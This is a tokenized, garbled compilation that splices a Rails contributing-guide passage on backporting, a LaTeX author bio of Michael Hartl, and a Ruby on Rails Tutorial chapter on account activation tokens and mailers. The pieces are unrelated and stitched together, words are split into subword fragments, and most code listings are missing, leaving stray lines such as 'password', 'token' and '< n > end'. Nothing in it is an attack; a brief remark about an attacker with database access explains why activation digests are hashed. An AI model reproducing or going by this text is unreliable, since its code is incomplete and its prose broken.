▁Here ▁is ▁an ▁example ▁to ▁switch ▁to ▁the ▁4 - 0 - s table ▁branch :
▁ $ ▁git ▁branch ▁-- t rack ▁4 - 0 - s table ▁ origin / 4 - 0 - s table
▁ $ ▁git ▁ checkout ▁4 - 0 - s table
▁TIP : ▁You ▁may ▁want ▁to ▁[ put ▁your ▁Git ▁branch ▁name ▁in ▁your ▁ s hel l ▁prompt ]( http :// q ug start . com / blog / git - and - s v n / add - color ed - git - branch - name - to - your - s hel l - p r o mp t / ) ▁to ▁make ▁it ▁easier ▁to ▁remember ▁which ▁version ▁of ▁the ▁code ▁you ' re ▁working ▁with .
▁#### ▁B ac k port ing
▁Change s ▁that ▁are ▁merge d ▁into ▁master ▁are ▁intend ed ▁for ▁the ▁next ▁major ▁release ▁of ▁Rails .
▁Sometimes , ▁it ▁m ight ▁be ▁be n e fi cial ▁for ▁your ▁changes ▁to ▁pro p a g ate ▁back ▁to ▁the ▁ maintenance ▁release s ▁for ▁older ▁ s table ▁branches .
▁General ly , ▁security ▁fix es ▁and ▁bug ▁fix es ▁are ▁good ▁can d id ate s ▁for ▁a ▁back port , ▁while ▁new ▁features ▁and ▁ patch es ▁that ▁introduce ▁a ▁change ▁in ▁behavior ▁will ▁not ▁be ▁accepted .
▁When ▁in ▁do u b t , ▁it ▁is ▁best ▁to ▁consult ▁a ▁Rails ▁team ▁member ▁before ▁back port ing ▁your ▁changes ▁to ▁avoid ▁was t ed ▁effort .
▁For ▁simple ▁fix es , ▁the ▁easie st ▁way ▁to ▁back port ▁your ▁changes ▁is ▁to ▁[ extract ▁a ▁d if f ▁from ▁your ▁changes ▁in ▁master ▁and ▁apply ▁them ▁to ▁the ▁target ▁branch ]( http :// ar i e j an . net / 200 9 / 10 / 2 6 / how - to - create - and - app ly - a - patch - with - git ).
▁First ▁make ▁sure ▁your ▁changes ▁are ▁the ▁only ▁difference ▁between ▁your ▁current ▁branch ▁and ▁master :
▁ $ ▁git ▁log ▁master . .
▁Then ▁extract ▁the ▁d if f :
▁ $ ▁git ▁format - patch ▁master ▁-- st d out ▁ > ▁ ~ / my _ change s . patch
▁S w it ch ▁over ▁to ▁the ▁target ▁branch ▁and ▁apply ▁your ▁changes :
▁ $ ▁git ▁ checkout ▁- b ▁my _ back port _ branch ▁ 3- 2 - s table
▁ $ ▁git ▁apply ▁ ~ / my _ change s . patch
▁This ▁works ▁well ▁for ▁simple ▁changes .
▁However , ▁if ▁your ▁changes ▁are ▁complicated ▁or ▁if ▁the ▁code ▁in ▁master ▁has ▁d evi at ed ▁significant ly ▁from ▁your ▁target ▁branch , ▁it ▁m ight ▁require ▁more ▁work ▁on ▁your ▁part .
▁The ▁difficult y ▁of ▁a ▁back port ▁var ies ▁great ly ▁from ▁case ▁to ▁case , ▁and ▁some times ▁it ▁is ▁simply ▁not ▁worth ▁the ▁effort .
▁On ce ▁you ▁have ▁resolve d ▁all ▁conflicts ▁and ▁made ▁sure ▁all ▁the ▁tests ▁are ▁passing , ▁push ▁your ▁changes ▁and ▁open ▁a ▁separate ▁pull ▁request ▁for ▁your ▁back port .
▁It ▁is ▁also ▁worth ▁noting ▁that ▁older ▁branches ▁m ight ▁have ▁a ▁different ▁set ▁of ▁build ▁target s ▁than ▁master .
▁When ▁possible , ▁it ▁is ▁best ▁to ▁first ▁test ▁your ▁back port ▁local ly ▁again st ▁the ▁Ruby ▁versions ▁list ed ▁in ▁` . t ra v is . yml ` ▁before ▁ submitting ▁your ▁pull ▁request .
▁Rails ▁ Contribut or s
▁All ▁con tr i but ion s , ▁either ▁via ▁master ▁or ▁ doc rails , ▁get ▁c r edit ▁in ▁[ Rails ▁ Contribut or s ]( http :// contributor s . rubyonrails . org ).
▁You ▁can ▁help ▁improve ▁the ▁Rails ▁guide s ▁by ▁making ▁them ▁more ▁co h er ent , ▁consistent ▁or ▁read able , ▁adding ▁missing ▁information , ▁correct ing ▁f actual ▁errors , ▁fix ing ▁t y p o s , ▁or ▁ br ing ing ▁it ▁up ▁to ▁date ▁with ▁the ▁latest ▁edge ▁Rails . < n >< n >
▁class ▁Application ▁< ▁Rails :: Application
▁\ href { http :// www . michael hartl . com /}{ Michael ▁Hartl } ▁is ▁the ▁author ▁of ▁the ▁\ href { http :// www . railstutorial . org / }{\ emph { Ruby ▁on ▁Rails ▁Tutorial } }, ▁one ▁of ▁the ▁leading ▁introduction s ▁to ▁web ▁development , ▁and ▁is ▁a ▁c of ound er ▁of ▁the ▁\ href { http :// www . s of t c over . io /}{ S of t c over } ▁self - p u b li s h ing ▁platform .
▁H is ▁prior ▁experience ▁includes ▁writing ▁and ▁developing ▁\ emph { Rails Space }, ▁an ▁ extremely ▁ ob so let e ▁Rails ▁tutorial ▁book , ▁and ▁developing ▁In so s h i , ▁a ▁once - p o p ul ar ▁and ▁now - ob so let e ▁so cial ▁network ing ▁platform ▁in ▁Ruby ▁on ▁Rails .
▁In ▁ 2011 , ▁ Michael ▁receive d ▁a ▁\ href { http :// ruby h er o es . com / h er o es }{ Ruby ▁H er o ▁A w ar d } ▁for ▁his ▁con tr i but ion s ▁to ▁the ▁Ruby ▁community .
▁H e ▁is ▁a ▁gra d u ate ▁of ▁\ href { http :// co ll e ge . h ar v ar d . ed u /}{ H ar v ar d ▁Co ll e ge }, ▁has ▁a ▁\ href { http :// re s ol ve r . c al tech . ed u / C al tech E T D : et d - 0 5 22 200 3- 16 16 2 6 }{ P h . D . ▁in ▁P h y s ic s } ▁from ▁\ href { http :// www . c al tech . ed u /}{ C al tech }, ▁and ▁is ▁an ▁ al um n us ▁of ▁the ▁\ href { http :// y com bin at or . com /}{ Y ~ Co m bin at or } ▁ ent re pre n e ur ▁program .
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ▁finished ▁making ▁a ▁basic ▁Users ▁resource ▁( filling ▁in ▁all ▁the ▁standard ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users }), ▁together ▁with ▁a ▁flexible ▁authentication ▁and ▁authorization ▁system .
▁In ▁this ▁chapter , ▁we ' ll ▁put ▁the ▁finish ing ▁ touch es ▁on ▁this ▁system ▁by ▁adding ▁two ▁close ly ▁related ▁features : ▁account ▁activation ▁( which ▁verifie s ▁a ▁new ▁user ' s ▁email ▁address ) ▁and ▁password ▁reset ▁( for ▁users ▁who ▁ forget ▁their ▁passwords ).
▁ Each ▁of ▁these ▁two ▁features ▁will ▁involve ▁creating ▁a ▁new ▁resource , ▁there by ▁giv ing ▁us ▁a ▁chance ▁to ▁see ▁further ▁examples ▁of ▁controllers , ▁routing , ▁and ▁database ▁migrations .
▁In ▁the ▁process , ▁we ' ll ▁also ▁have ▁a ▁chance ▁to ▁learn ▁how ▁to ▁send ▁email ▁in ▁Rails , ▁both ▁in ▁development ▁and ▁in ▁production .
▁F inally , ▁the ▁two ▁features ▁complement ▁each ▁other ▁nicely : ▁password ▁resets ▁involve ▁sending ▁a ▁reset ▁link ▁to ▁a ▁user ' s ▁email ▁address , ▁the ▁validity ▁of ▁which ▁is ▁ confirmed ▁by ▁the ▁initial ▁account ▁activation
▁ . \ foo t not e {
▁ Technical ly , ▁a ▁user ▁could ▁update ▁their ▁account ▁with ▁an ▁ er r one ous ▁email ▁address ▁using ▁the ▁account ▁settings ▁update ▁feature ▁from ▁Section ~\ ref { sec : updating _ users }, ▁but ▁the ▁current ▁implementation ▁get s ▁us ▁most ▁of ▁the ▁benefit ▁of ▁email ▁ ve r if ic ation ▁without ▁too ▁much ▁work .
▁ }< n >< n >\ section { Account ▁activation } ▁% ▁( fold )< n >\ label { sec : account _ activation }< n >< n >
▁At ▁present , ▁new ly ▁registered ▁users ▁immediately ▁have ▁full ▁access ▁to ▁their ▁account s ▁( Chapter ~\ ref { cha : sign _ up }).
▁In ▁this ▁section , ▁we ' ll ▁implement ▁an ▁account ▁activation ▁step ▁to ▁verify ▁that ▁the ▁user ▁control s ▁the ▁email ▁address ▁they ▁used ▁to ▁sign ▁up .
▁This ▁will ▁involve ▁associat ing ▁an ▁activation ▁token ▁and ▁digest ▁with ▁a ▁user , ▁sending ▁the ▁user ▁an ▁email ▁with ▁a ▁link ▁including ▁the ▁token , ▁and ▁ activating ▁the ▁user ▁upon ▁click ing ▁the ▁link .
▁Ou r ▁strategy ▁for ▁handling ▁account ▁activation ▁parallel s ▁user ▁login ▁\ line break ▁( Section ~\ ref { sec : logging _ in }) ▁and ▁es pecially ▁remember ing ▁users ▁( Section ~\ ref { sec : remember _ me }).
▁The ▁basic ▁sequence ▁appears ▁as ▁follows :
▁Start ▁users ▁in ▁an ▁`` un activated '' ▁state .
▁When ▁a ▁user ▁sign s ▁up , ▁generate ▁an ▁activation ▁token ▁and ▁corresponding ▁activation ▁digest .
▁S a ve ▁the ▁activation ▁digest ▁to ▁the ▁database , ▁and ▁the n ▁send ▁an ▁email ▁to ▁the ▁user ▁with ▁a ▁link ▁containing ▁the ▁activation ▁token ▁and ▁user ' s ▁email ▁address
▁We ▁could ▁use ▁the ▁user ' s ▁id ▁instead , ▁since ▁it ' s ▁already ▁expose d ▁in ▁the ▁URLs ▁of ▁our ▁application , ▁but ▁using ▁email ▁addresses ▁is ▁more ▁future - proof ▁in ▁case ▁we ▁want ▁to ▁ ob f us c ate ▁user ▁id s ▁for ▁any ▁reason ▁( such ▁as ▁to ▁prevent ▁com p et it or s ▁from ▁know ing ▁how ▁many ▁users ▁our ▁application ▁has , ▁for ▁example ).
▁When ▁the ▁user ▁click s ▁the ▁link , ▁find ▁the ▁user ▁by ▁email ▁address , ▁and ▁the n ▁authenticate ▁the ▁token ▁by ▁compar ing ▁with ▁the ▁activation ▁digest .
▁If ▁the ▁user ▁is ▁ authenticated , ▁change ▁the ▁status ▁from ▁`` un activated '' ▁to ▁`` activated ''.
▁Because ▁of ▁the ▁similar ity ▁with ▁passwords ▁and ▁remember ▁token s , ▁we ▁will ▁be ▁able ▁to ▁reuse ▁many ▁of ▁the ▁same ▁idea s ▁for ▁account ▁activation ▁( as ▁well ▁as ▁password ▁reset ), ▁including ▁the ▁\ k ode { User . digest } ▁and ▁\ k ode { User . new \_ token } ▁methods ▁and ▁a ▁modified ▁version ▁of ▁the ▁\ k ode { user . authenticated ?}\ ▁method .
▁Table ~\ ref { table : password _ token _ digest } ▁illustrate s ▁the ▁analogy ▁( including ▁the ▁password ▁reset ▁from ▁Section ~\ ref { sec : password _ reset }).
▁We ' ll ▁define ▁the ▁ generalized ▁version ▁of ▁the ▁\ k ode { authenticated ?}\ ▁method ▁from ▁Table ~\ ref { table : password _ token _ digest } ▁in ▁Section ~\ ref { sec : activating _ the _ account }.
▁find ~ by
▁ authenticated ?( : remember , ▁token )
▁ authenticated ?( : activation , ▁token )
▁ authenticated ?( : reset , ▁token )
▁The ▁analogy ▁between ▁login , ▁remember ing , ▁account ▁activation , ▁and ▁password ▁reset .
▁As ▁usual , ▁we ' ll ▁make ▁a ▁topic ▁branch ▁for ▁the ▁new ▁feature .
▁As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : email _ in _ production }, ▁account ▁activation ▁and ▁password ▁reset ▁include ▁some ▁common ▁email ▁configuration , ▁which ▁we ' ll ▁want ▁to ▁apply ▁to ▁both ▁features ▁before ▁m er g ing ▁to ▁master .
▁As ▁a ▁result , ▁it ' s ▁convenient ▁to ▁use ▁a ▁common ▁topic ▁branch :
▁master
▁As ▁with ▁sessions ▁( Section ~\ ref { sec : sessions _ and _ failed _ login }), ▁we ' ll ▁model ▁account ▁activation s ▁as ▁a ▁resource ▁even ▁though ▁they ▁won ' t ▁be ▁ associated ▁with ▁an ▁Active ▁Record ▁model .
▁Instead , ▁we ' ll ▁include ▁the ▁relevant ▁data ▁( including ▁the ▁activation ▁token ▁and ▁activation ▁status ) ▁in ▁the ▁User ▁model .
▁It ▁m ight ▁even ▁make ▁more ▁sense ▁to ▁use ▁an ▁\ k ode { update } ▁action , ▁but ▁the ▁activation ▁link ▁needs ▁to ▁be ▁sent ▁in ▁an ▁email ▁and ▁hence ▁should ▁involve ▁a ▁regular ▁browser ▁click , ▁which ▁issues ▁a ▁\ text tt { GET } ▁request ▁instead ▁of ▁the ▁\ text tt { PATCH } ▁request ▁required ▁by ▁the ▁\ k ode { update } ▁action .
▁This
▁Because ▁we ' ll ▁be ▁using ▁an ▁\ k ode { edit } ▁action , ▁we ▁could ▁include ▁\ k ode { edit } ▁on ▁the ▁command ▁line , ▁but ▁this ▁would ▁also ▁generate ▁both ▁an ▁edit ▁view ▁and ▁a ▁test , ▁ n either ▁of ▁which ▁we ' ll ▁turn ▁out ▁to ▁need .
▁ $ ▁rails ▁generate
▁-- no - test - framework
▁Note ▁that ▁we ' ve ▁included ▁a ▁flag ▁to ▁skip ▁ generating ▁tests .
▁This ▁is ▁because ▁we ▁don ' t ▁need ▁the ▁controller ▁tests ▁( p ref er r ing ▁instead ▁to ▁use ▁an ▁integration ▁test ▁( Section ~\ ref { sec : activation _ test _ and _ refactoring }) ), ▁so ▁it ' s ▁convenient ▁to ▁omit ▁them .
▁The ▁activation ▁email ▁will ▁involve ▁a ▁URL ▁of ▁the ▁form
▁which ▁means ▁we ' ll ▁need ▁a ▁named ▁route ▁for ▁the ▁\ k ode { edit } ▁action .
▁We ▁can ▁arrange ▁this ▁with ▁the ▁\ k ode { resources } ▁line ▁show n ▁in ▁Listing ~\ ref { code : account _ activation s _ route }.
▁ Adding ▁a ▁resource ▁for ▁account ▁activation s .
▁Next , ▁we ▁need ▁a ▁unique ▁activation ▁token ▁to ▁activate ▁users .
▁password
▁token
▁For ▁example , ▁an ▁attacker ▁with ▁access ▁to ▁the ▁database ▁could ▁immediately ▁activate ▁new ly ▁created ▁account s , ▁there by ▁logging ▁in ▁as ▁the ▁user , ▁and ▁could ▁the n ▁change ▁the ▁password ▁to ▁gain ▁control .
▁following
▁digest
▁This ▁way ▁we ▁can ▁access ▁the ▁activation ▁token ▁using
▁and ▁authenticate ▁the ▁user ▁with ▁code ▁like
▁( This ▁will ▁require ▁a ▁modification ▁of ▁the ▁\ k ode { authenticated ?}\ ▁method ▁defined ▁in ▁Listing ~\ ref { code : authenticated _ p }. )
▁We ' ll ▁also ▁add ▁a ▁boolean ▁attribute ▁\ k ode { activated }, ▁which ▁will ▁allow ▁us ▁to ▁test ▁if ▁a ▁user ▁is ▁ activated ▁using ▁the ▁same ▁kind ▁of ▁ auto - generated ▁boolean ▁method ▁we ▁saw ▁in ▁Section ~\ ref { sec : administrative _ users } :
▁F inally , ▁although ▁we ▁won ' t ▁use ▁it ▁in ▁this ▁tutorial , ▁we ' ll ▁record ▁the ▁time ▁and ▁date ▁of ▁the ▁activation ▁in ▁case ▁we ▁want ▁it ▁for ▁future ▁reference .
▁The ▁full ▁data ▁model ▁appears ▁in ▁F igure ~\ ref { fig : user _ model _ account _ activation }.
▁The ▁User ▁model ▁with ▁added ▁account ▁activation ▁attributes .
▁The ▁migration ▁to ▁add ▁the ▁data ▁model ▁from ▁F igure ~\ ref { fig : user _ model _ account _ activation } ▁add s ▁all ▁three ▁attributes ▁at ▁the ▁command ▁line :
▁As ▁with ▁the ▁\ k ode { admin } ▁attribute ▁( Listing ~\ ref { code : admin _ migration }), ▁we ' ll ▁add ▁a ▁default ▁boolean ▁value ▁of ▁\ k ode { false } ▁to ▁the ▁\ k ode { activated } ▁attribute , ▁as ▁show n ▁in ▁in ▁Listing ~\ ref { code : add _ activation _ to _ users _ migration }.
▁A ▁migration ▁for ▁account ▁activation ▁( with ▁added ▁index ).
▁< n > ▁end
▁We ▁the n ▁apply ▁the ▁migration ▁as ▁usual :
▁ $ ▁bundle ▁exec ▁rake ▁db : migrate
▁Because ▁every ▁new ly ▁signed - up ▁user ▁will ▁require ▁activation , ▁we ▁should ▁assign ▁an ▁activation ▁token ▁and ▁digest ▁to ▁each ▁user ▁object ▁before ▁it ' s ▁created .
▁We ▁saw ▁a ▁similar ▁idea ▁in ▁Section ~\ ref { sec : uniqueness _ validation }, ▁where ▁we ▁needed ▁to ▁convert ▁an ▁email ▁address ▁to ▁lower - case ▁before ▁saving ▁a ▁user ▁to ▁the ▁database .
▁In ▁that ▁case , ▁we ▁used ▁a ▁\ k ode { before \_ save } ▁callback ▁combine d ▁with ▁the ▁\ k ode { downcase } ▁method ▁( Listing ~\ ref { code : email _ downcase }).
▁A ▁\ k ode { before \_ save } ▁callback ▁is ▁automatically ▁called ▁before ▁the ▁object ▁is ▁saved , ▁which ▁includes ▁both ▁object ▁creation ▁and ▁update s , ▁but ▁in ▁the ▁case ▁of ▁the ▁activation ▁digest ▁we ▁only ▁want ▁the ▁callback ▁to ▁fire ▁when ▁the ▁user ▁is ▁created .
▁This ▁requires ▁a ▁\ k ode { before \_ create } ▁callback , ▁which ▁we ' ll ▁define ▁as ▁follows :
▁This ▁code , ▁called ▁a ▁\ emph { method ▁reference }, ▁arrange s ▁for ▁Rails ▁to ▁look ▁for ▁a ▁method ▁called ▁\ k ode { create \_ activation \_ digest } ▁and ▁run ▁it ▁before ▁creating ▁the ▁user .
▁( In ▁Listing ~\ ref { code : email _ downcase }, ▁we ▁passed ▁\ k ode { before \_ save } ▁an ▁explicit ▁block , ▁but ▁the ▁method ▁reference ▁technique ▁is ▁generally ▁preferred .)
▁private
▁All ▁methods ▁defined ▁in ▁a ▁class ▁after ▁\ k ode { private } ▁are ▁automatically ▁hidden , ▁as ▁seen ▁in ▁this ▁console ▁session :
▁ $ ▁rails ▁console
▁The ▁purpose ▁of ▁the ▁\ k ode { before \_ create } ▁callback ▁is ▁to ▁assign ▁the ▁token ▁and ▁corresponding ▁digest , ▁which ▁we ▁can ▁accomplish ▁as ▁follows :
▁This ▁code ▁simply ▁reuse s ▁the ▁token ▁and ▁digest ▁methods ▁used ▁for ▁the ▁remember ▁token , ▁as ▁we ▁can ▁see ▁by ▁compar ing ▁with ▁the ▁\ k ode { remember } ▁method ▁from ▁Listing ~\ ref { code : user _ model _ remember } :
▁# ▁Re member s ▁a ▁user ▁in ▁the ▁database ▁for ▁use ▁in ▁ persistent ▁sessions .
▁The ▁main ▁difference ▁is ▁the ▁use ▁of ▁\ k ode { update \_ attribute } ▁in ▁the ▁latter ▁case .
▁The ▁reason ▁for ▁the ▁difference ▁is ▁that ▁remember ▁token s ▁and ▁digest s ▁are ▁created ▁for ▁users ▁that ▁already ▁exist ▁in ▁the ▁database , ▁whereas ▁the ▁\ k ode { before \_ create } ▁callback ▁happens ▁\ emph { before } ▁the ▁user ▁has ▁been ▁created .
▁As ▁a ▁result ▁of ▁the ▁callback , ▁when ▁a ▁new ▁user ▁is ▁defined ▁with ▁\ k ode { User . new } ▁( as ▁in ▁user ▁signup , ▁Listing ~\ ref { code : create _ action _ strong _ parameters }), ▁it ▁will ▁automatically ▁get ▁both ▁\ k ode { activation \_ token } ▁and ▁\ k ode { activation \_ digest } ▁attributes ; ▁because ▁the ▁latter ▁is ▁ associated ▁with ▁a ▁column ▁in ▁the ▁database ▁( F igure ~\ ref { fig : user _ model _ account _ activation }), ▁it ▁will ▁be ▁written ▁automatically ▁when ▁the ▁user ▁is ▁saved .
▁P utting ▁together ▁the ▁discussion ▁above ▁yields ▁the ▁User ▁model ▁show n ▁in ▁Listing ~\ ref { code : user _ model _ activation _ code }.
▁As ▁required ▁by ▁the ▁virtual ▁nature ▁of ▁the ▁activation ▁token , ▁we ' ve ▁added ▁a ▁second ▁\ k ode { attr \_ accessor } ▁to ▁our ▁model .
▁Note ▁that ▁we ' ve ▁take n ▁the ▁opportunit y ▁to ▁use ▁a ▁method ▁reference ▁for ▁email ▁downcas ing ▁as ▁well .
▁ Adding ▁account ▁activation ▁code ▁to ▁the ▁User ▁model .
▁email
▁< n > ▁end
▁Before ▁mov ing ▁on , ▁we ▁should ▁also ▁update ▁our ▁see d ▁data ▁and ▁fixtures ▁so ▁that ▁our ▁sample ▁and ▁test ▁users ▁are ▁initially ▁ activated , ▁as ▁show n ▁in ▁Listing ~\ ref { code : seed _ users _ activated } ▁and ▁Listing ~\ ref { code : fixture _ users _ activated }.
▁( The ▁\ k ode { Time . zone . now } ▁method ▁is ▁a ▁built - in ▁Rails ▁helper ▁that ▁returns ▁the ▁current ▁timestamp , ▁tak ing ▁into ▁account ▁the ▁time ▁zone ▁on ▁the ▁server .)
▁A c t i v at ing ▁see d ▁users ▁by ▁default .
▁A c t i v at ing ▁fixture ▁users .
▁Example
▁To ▁apply ▁the ▁changes ▁in ▁Listing ~\ ref { code : seed _ users _ activated }, ▁reset ▁the ▁database ▁to ▁re seed ▁the ▁data ▁as ▁usual :
▁ $ ▁bundle ▁exec ▁rake ▁db : migrate : reset < n > $ ▁bundle ▁exec ▁rake ▁db : seed
▁With ▁the ▁data ▁model ing ▁complete , ▁we ' re ▁now ▁ready ▁to ▁add ▁the ▁code ▁needed ▁to ▁send ▁an ▁account ▁activation ▁email .
▁The ▁method ▁is ▁to ▁add ▁a ▁User ▁\ emph { mailer } ▁using ▁the ▁Action ▁Mailer ▁library , ▁which ▁we ' ll ▁use ▁in ▁the ▁Users ▁controller ▁\ k ode { create } ▁action ▁to ▁send ▁an ▁email ▁with ▁an ▁activation ▁link .
▁Mailer s ▁are ▁structure d ▁much ▁like ▁controller ▁actions , ▁with ▁email ▁templates ▁defined ▁as ▁views .
▁Ou r ▁task ▁in ▁this ▁section ▁is ▁to ▁define ▁the ▁mailer s ▁and ▁views ▁with ▁links ▁containing ▁the ▁activation ▁token ▁and ▁email ▁address ▁ associated ▁with ▁the ▁account ▁to ▁be ▁ activated .
▁As ▁with ▁models ▁and ▁controllers , ▁we ▁can ▁generate ▁a ▁mailer ▁using ▁\ k ode { rails ▁generate } :
▁Here ▁we ' ve ▁generated ▁the ▁necessary ▁\ k ode { account \_ activation } ▁method ▁as ▁well ▁as ▁the ▁\ k ode { password \_ reset } ▁method ▁we ' ll ▁need ▁in ▁Section ~\ ref { sec : password _ reset }.
▁As ▁part ▁of ▁ generating ▁the ▁mailer , ▁Rails ▁also ▁generates ▁two ▁view ▁templates ▁for ▁each ▁mailer , ▁one ▁for ▁plain - text ▁email ▁and ▁one ▁for ▁HTML ▁email .
▁For ▁the ▁account ▁activation ▁mailer ▁method , ▁they ▁appear ▁as ▁in ▁Listing ~\ ref { code : generated _ account _ activation _ view _ text } ▁and ▁Listing ~\ ref { code : generated _ account _ activation _ view _ html }.
▁The ▁generated ▁account ▁activation ▁text ▁view .
▁The ▁generated ▁account ▁activation ▁HTML ▁view .
▁Let ' s ▁take ▁a ▁look ▁at ▁the ▁generated ▁mailer s ▁to ▁get ▁a ▁sense ▁of ▁how ▁they ▁work ▁( Listing ~\ ref { code : generated _ application _ mailer } ▁and ▁Listing ~\ ref { code : generated _ user _ mailer }).
▁We ▁see ▁in ▁Listing ~\ ref { code : generated _ application _ mailer } ▁that ▁there ▁is ▁a ▁default ▁\ k ode { from } ▁address ▁common ▁to ▁all ▁mailer s ▁in ▁the ▁application , ▁and ▁each ▁method ▁in ▁Listing ~\ ref { code : generated _ user _ mailer } ▁has ▁a ▁re c ip i ent ' s ▁address ▁as ▁well .
▁( Listing ~\ ref { code : generated _ application _ mailer } ▁also ▁uses ▁a ▁mailer ▁layout ▁corresponding ▁to ▁the ▁email ▁format ; ▁although ▁it ▁won ' t ▁ever ▁matter ▁in ▁this ▁tutorial , ▁the ▁result ing ▁HTML ▁and ▁plain - text ▁mailer ▁layout s ▁can ▁be ▁found ▁in ▁\ k ode { app / views / layouts }. )
▁The ▁generated ▁code ▁also ▁includes ▁an ▁instance ▁variable ▁(\ k ode {@ greeting }), ▁which ▁is ▁available ▁in ▁the ▁mailer ▁views ▁in ▁much ▁the ▁same ▁way ▁that ▁instance ▁variables ▁in ▁controllers ▁are ▁available ▁in ▁ordinar y ▁views .
▁The ▁generated ▁application ▁mailer .
▁The ▁generated ▁User ▁mailer .
▁To ▁make ▁a ▁working ▁activation ▁email , ▁we ' ll ▁first ▁customize ▁the ▁generated ▁template ▁as ▁show n ▁in ▁Listing ~\ ref { code : application _ mailer }.
▁Next , ▁we ' ll ▁create ▁an ▁instance ▁variable ▁containing ▁the ▁user ▁( for ▁use ▁in ▁the ▁view ), ▁and ▁the n ▁mail ▁the ▁result ▁to ▁\ k ode { user . email } ▁( Listing ~\ ref { code : mail _ account _ activation }).
▁The ▁application ▁mailer ▁with ▁a ▁new ▁default ▁\ k ode { from } ▁address .
▁ Mail ing ▁the ▁account ▁activation ▁link .
▁As ▁with ▁ordinar y ▁views , ▁we ▁can ▁use ▁ embedded ▁Ruby ▁to ▁customize ▁the ▁template ▁views , ▁in ▁this ▁case ▁ greeting ▁the ▁user ▁by ▁name ▁and ▁including ▁a ▁link ▁to ▁a ▁custom ▁activation ▁link .
▁Ou r ▁plan ▁is ▁to ▁find ▁the ▁user ▁by ▁email ▁address ▁and ▁the n ▁authenticate ▁the ▁activation ▁token , ▁so ▁the ▁link ▁needs ▁to ▁include ▁both ▁the ▁email ▁and ▁the ▁token .
▁Because ▁we ' re ▁model ing ▁activation s ▁using ▁an ▁ Account ▁A c t i v ation s ▁resource , ▁the ▁token ▁itself ▁can ▁appear ▁as ▁the ▁argument ▁of ▁the ▁named ▁route ▁defined ▁in ▁Listing ~\ ref { code : account _ activation s _ route } :
▁Recall ing ▁that
▁produce s ▁a ▁URL ▁of ▁the ▁form
▁ http :// www . example . com / users /1/ edit
▁the ▁corresponding ▁account ▁activation ▁link ' s ▁base ▁URL ▁will ▁look ▁like ▁this :
▁ http :// www . example . com / account _ activation s / q 5 lt 38 h Q D c _ 9 59 P V oo 6 b 7 A / edit
▁Here ▁\ k ode { q 5 lt 38 h Q D c \_ 9 59 P V oo 6 b 7 A } ▁is ▁a ▁URL - safe ▁base 64 ▁string ▁generated ▁by ▁the ▁\ k ode { new \_ token } ▁method ▁( Listing ~\ ref { code : token _ method }), ▁and ▁it ▁ play s ▁the ▁same ▁role ▁as ▁the ▁user ▁id ▁in ▁/ users /1/ edit .
▁In ▁particular , ▁in ▁the ▁A c t i v ation s ▁controller ▁\ k ode { edit } ▁action , ▁the ▁token ▁will ▁be ▁available ▁in ▁the ▁\ k ode { params } ▁hash ▁as ▁\ k ode { params [: id ]} .
▁In ▁order ▁to ▁include ▁the ▁email ▁as ▁well , ▁we ▁need ▁to ▁use ▁a ▁\ emph { query ▁parameter }, ▁which ▁in ▁a ▁URL ▁appears ▁as ▁a ▁key - value ▁pair ▁located ▁after ▁a ▁question ▁mark
▁email = foo %40 example . com
▁When ▁using ▁named ▁routes ▁in ▁this ▁way ▁to ▁define ▁query ▁parameters , ▁Rails ▁automatically ▁escape s ▁out ▁any ▁special ▁characters .
▁The ▁result ing ▁email ▁address ▁will ▁also ▁be ▁un escape d ▁automatically ▁in ▁the ▁controller , ▁and ▁will ▁be ▁available ▁via ▁\ k ode { params [: email ]} .
▁With ▁the ▁\ k ode {@ user } ▁instance ▁variable ▁as ▁defined ▁in ▁Listing ~\ ref { code : mail _ account _ activation }, ▁we ▁can ▁create ▁the ▁necessary ▁links ▁using ▁the ▁named ▁edit ▁route ▁and ▁ embedded ▁Ruby , ▁as ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and ▁Listing ~\ ref { code : account _ activation _ view _ html }.
▁Note ▁that ▁the ▁HTML ▁template ▁in ▁Listing ~\ ref { code : account _ activation _ view _ html } ▁uses ▁the ▁\ k ode { link \_ to } ▁method ▁to ▁construct ▁a ▁valid ▁link .
▁The ▁account ▁activation ▁text ▁view .
▁The ▁account ▁activation ▁HTML ▁view .
▁To ▁see ▁the ▁results ▁of ▁the ▁templates ▁defined ▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and ▁\ line break ▁Listing ~\ ref { code : account _ activation _ view _ html }, ▁we ▁can ▁use ▁\ emph { email ▁preview s }, ▁which ▁are ▁special ▁URLs ▁expose d ▁by ▁Rails ▁to ▁let ▁us ▁see ▁what ▁our ▁email ▁messages ▁look ▁like .
▁First , ▁we ▁need ▁to ▁add ▁some ▁configuration ▁to ▁our ▁application ' s ▁development ▁environment , ▁as ▁show n ▁in ▁Listing ~\ ref { code : development _ email _ settings }.
▁Email ▁settings ▁in ▁development .
▁Listing ~\ ref { code : development _ email _ settings } ▁uses ▁a ▁host ▁name ▁of ▁\ k ode { ' example . com ' }, ▁but ▁you ▁should ▁use ▁the ▁actual ▁host ▁of ▁your ▁development ▁environment .
▁For ▁example , ▁on ▁my ▁system ▁either ▁of ▁the ▁following ▁works ▁( de pending ▁on ▁whether ▁I ' m ▁using ▁the ▁cloud ▁IDE ▁or ▁the ▁local ▁server ) :
▁After ▁restart ing ▁the ▁development ▁server ▁to ▁activate ▁the ▁configuration ▁in ▁Listing ~\ ref { code : development _ email _ settings }, ▁we ▁next ▁need ▁to ▁update ▁the ▁User ▁mailer ▁\ emph { preview ▁file }, ▁which ▁was ▁automatically ▁generated ▁in ▁Section ~\ ref { sec : account _ activation _ mailer }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s }.
▁The ▁generated ▁User ▁mailer ▁preview s .
▁< n >< n > end
▁Because ▁the ▁\ k ode { account \_ activation } ▁method ▁defined ▁in ▁Listing ~\ ref { code : mail _ account _ activation } ▁requires ▁a ▁valid ▁user ▁object ▁as ▁an ▁argument , ▁the ▁code ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s } ▁won ' t ▁work ▁as ▁written .
▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and
▁( Because ▁\ k ode { activation \_ token } ▁is ▁a ▁virtual ▁attribute ▁( Section ~\ ref { sec : account _ activation s _ resource }), ▁the ▁user ▁from ▁the ▁database ▁does n ' t ▁have ▁one .)
